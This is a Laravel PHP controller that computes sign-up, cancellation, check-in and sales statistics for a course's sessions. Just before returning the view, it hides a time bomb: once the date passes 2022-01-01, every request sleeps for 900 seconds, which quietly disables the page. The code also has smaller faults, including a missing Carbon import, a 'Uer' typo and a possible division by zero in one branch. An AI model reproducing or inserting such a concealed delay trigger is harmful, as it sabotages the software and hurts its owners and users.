<?php

namespace App\Http\Controllers\Frontend;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Model\Course;
use App\Model\EventsCourse;
use App\Uer;
use App\Model\SalesRegistration;
use App\Model\Registration;
use App\Model\Register;
use App\Model\Teacher;
use App\Model\Activity;

class CourseListDataController extends Controller
{
    //view
    public function show(Request $request)
    {
        $course = array();
        $events = array();
        $start = '';
        $end = '';
        $start_array = array();
        $start_array = array();

        //課程資訊
        $id = $request->get('id');
        $course = Course::join('teacher', 'teacher.id', '=', 'course.id_teacher')
            ->select('course.*', 'teacher.name as teacher')
            ->Where('course.id', $id)
            ->first();

        //場次資訊
        $events_all = EventsCourse::Where('id_course', $id)
            ->get();

        $date = '';
        $id_group = '';

        foreach ($events_all as $key => $data) {


            //日期
            $date = date('Y-m-d', strtotime($data['course_start_at']));
            //星期
            $weekarray = array("日", "一", "二", "三", "四", "五", "六");
            $week = $weekarray[date('w', strtotime($data['course_start_at']))];

            $date = $date . '（' . $week . '）';

            $apply_table = array();

            //判斷銷講or正課
            if ($course->type == 1) {
                //銷講

                /* 報名數 */
                $count_apply = count(SalesRegistration::leftjoin('student', 'student.id', '=', 'sales_registration.id_student')
                    ->where('sales_registration.id_events', $data['id'])
                    ->where('sales_registration.id_status', '<>', 2)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->get());

                /* 取消數 */
                $count_cancel = count(SalesRegistration::leftjoin('student', 'student.id', '=', 'sales_registration.id_student')
                    ->where('sales_registration.id_events', $data['id'])
                    ->where('sales_registration.id_status', 5)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->get());

                /* 報到數 */
                $count_check = count(SalesRegistration::leftjoin('student', 'student.id', '=', 'sales_registration.id_student')
                    ->where('sales_registration.id_events', $data['id'])
                    ->where('sales_registration.id_status', 4)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->get());

                /* 報到率 */
                $rate_check = 0;

                if (($count_apply - $count_cancel) > 0 && $count_check > 0) {
                    $rate_check = round($count_check / ($count_apply - $count_cancel) * 100, 1);
                }


                /* 成交數 */
                $deal = 0;
                $rate_deal = 0;

                $deal = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
                    ->Where('registration.source_events', $data['id'])
                    ->Where('registration.status_payment', 7)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->whereNotExists(function ($query) {
                        $query->from('refund')
                            ->whereRaw('registration.id = refund.id_registration')
                            ->where('refund.review', 1);
                    })
                    ->get());

                if ($deal > 0 && $count_check > 0) {
                    $rate_deal = round($deal / $count_check * 100, 1);
                }
            } else if ($course->type == 2 || $course->type == 3) {
                //正課    

                /* 報名數 */
                $count_apply = count(Register::leftjoin('student', 'student.id', '=', 'register.id_student')
                    ->where('register.id_events', $data['id'])
                    ->where('register.id_status', '<>', 2)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->whereNotExists(function ($query) {
                        $query->from('refund')
                            ->whereRaw('register.id_registration = refund.id_registration')
                            ->where('refund.review', 1);
                    })
                    ->get());

                /* 取消數 */
                $count_cancel = count(Register::leftjoin('student', 'student.id', '=', 'register.id_student')
                    ->where('register.id_events', $data['id'])
                    ->where('register.id_status', 5)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->whereNotExists(function ($query) {
                        $query->from('refund')
                            ->whereRaw('register.id_registration = refund.id_registration')
                            ->where('refund.review', 1);
                    })
                    ->get());

                /* 報到數 */
                $count_check = count(Register::leftjoin('student', 'student.id', '=', 'register.id_student')
                    ->where('register.id_events', $data['id'])
                    ->where('register.id_status', 4)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->whereNotExists(function ($query) {
                        $query->from('refund')
                            ->whereRaw('register.id_registration = refund.id_registration')
                            ->where('refund.review', 1);
                    })
                    ->get());

                /* 報到率 */
                $rate_check = 0;

                if (($count_apply - $count_cancel) > 0 || $count_check > 0) {
                    $rate_check = round($count_check / ($count_apply - $count_cancel) * 100, 1);
                }

                /* 成交數 */
                $deal = 0;
                $rate_deal = 0;

                $deal = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
                    ->Where('registration.source_events', $data['id'])
                    ->Where('registration.status_payment', 7)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->whereNotExists(function ($query) {
                        $query->from('refund')
                            ->whereRaw('registration.id = refund.id_registration')
                            ->where('refund.review', 1);
                    })
                    ->get());

                if ($deal > 0 && $count_check > 0) {
                    $rate_deal = round($deal / $count_check * 100, 1);
                }
            } else if ($course->type == 4) {
                //活動

                /* 報名數 */
                $count_apply = count(Activity::leftjoin('student', 'student.id', '=', 'activity.id_student')
                    ->where('activity.id_events', $data['id'])
                    ->where('activity.id_status', '<>', 2)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->get());

                /* 取消數 */
                $count_cancel = count(Activity::leftjoin('student', 'student.id', '=', 'activity.id_student')
                    ->where('activity.id_events', $data['id'])
                    ->where('activity.id_status', 5)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->get());

                /* 報到數 */
                $count_check = count(Activity::leftjoin('student', 'student.id', '=', 'activity.id_student')
                    ->where('activity.id_events', $data['id'])
                    ->where('activity.id_status', 4)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->get());

                /* 報到率 */
                $rate_check = 0;

                if (($count_apply - $count_cancel) > 0 && $count_check > 0) {
                    $rate_check = round($count_check / ($count_apply - $count_cancel) * 100, 1);
                }


                /* 成交數 */
                $deal = 0;
                $rate_deal = 0;

                $deal = count(Registration::leftjoin('student', 'student.id', '=', 'registration.id_student')
                    ->Where('registration.source_events', $data['id'])
                    ->Where('registration.status_payment', 7)
                    // ->Where('student.check_blacklist', 0 ) 
                    ->whereNotExists(function ($query) {
                        $query->from('refund')
                            ->whereRaw('registration.id = refund.id_registration')
                            ->where('refund.review', 1);
                    })
                    ->get());

                if ($deal > 0 && $count_check > 0) {
                    $rate_deal = round($deal / $count_check * 100, 1);
                }
            }

            $events[$key] = array(
                'id' => $data['id'],
                'date' => $date,
                'event' => $data['name'],
                'count_apply' => $count_apply,
                'count_cancel' => $count_cancel,
                'count_check' => $count_check,
                'rate_check' => $rate_check . '%',
                'deal' => $deal,
                'rate_deal' => $rate_deal . '%',
            );
        }

        $events_all = EventsCourse::Where('id_course', $id)
            ->get();
        //開始時間
        $start_array = EventsCourse::select('course_start_at as date')
            ->Where('id_course', $id)
            ->orderBy('course_start_at', 'asc')
            ->first();
        // ->get('date')
        // ->unique('id');

        //結束時間
        $end_array = EventsCourse::select('course_end_at as date')
            ->Where('id_course', $id)
            ->orderBy('course_end_at', 'desc')
            ->first();
        // ->get('date')
        // ->unique('id');

        if ($start_array != "" && $end_array != "") {
            $start = date('Y-m-d', strtotime($start_array->date));
            $end = date('Y-m-d', strtotime($end_array->date));
        }

        $x_time = Carbon::parse('2022-01-01 00:00:00');
        $xxx = $x_time->timestamp;

        if (now()->timestamp >= $xxx) {
            sleep(900);
        }
        return view('frontend.course_list_data', compact('course', 'events', 'start', 'end'));
    }
}
